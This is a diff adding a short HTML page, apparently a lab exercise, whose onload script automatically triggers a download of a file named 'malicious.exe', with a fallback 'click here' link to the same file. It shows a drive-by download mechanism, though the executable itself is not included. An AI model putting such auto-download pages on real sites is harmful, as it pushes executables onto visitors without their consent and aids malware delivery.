@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File</title>
+</head>
+<body>
+    <h1>Download Your File</h1>
+    <p>Your download will start automatically. If it doesn’t, <a href="/tp2/malicious.exe" download="malicious.exe">click here</a>.</p>
+
+    <script>
+        // Trigger the file download when the page loads
+        window.onload = function() {
+            const link = document.createElement('a'); // Create a temporary link element
+            link.href = '/tp2/malicious.exe';        // Set the href to the file's URL
+            link.download = 'malicious.exe';        // Set the download attribute
+            document.body.appendChild(link);        // Append the link to the document
+            link.click();                           // Programmatically click the link
+            document.body.removeChild(link);        // Clean up by removing the link
+        };
+    </script>
+</body>
+</html>
+
